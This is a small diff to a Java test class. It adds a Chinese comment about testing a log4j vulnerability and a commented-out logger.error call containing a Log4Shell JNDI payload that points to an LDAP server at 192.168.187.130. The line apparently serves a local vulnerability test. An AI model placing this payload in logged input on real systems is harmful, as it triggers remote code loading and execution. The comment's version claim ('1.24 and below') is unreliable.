@@ -35,5 +35,7 @@ public class MyTest {
         MyUtils u = new MyUtils();
         u.output("xxxxxxxx");
         
+        // 测试log4j 1.24 以及以下的漏洞
+        // logger.error("${jndi:ldap://192.168.187.130:8081/x}");
 	}
 }
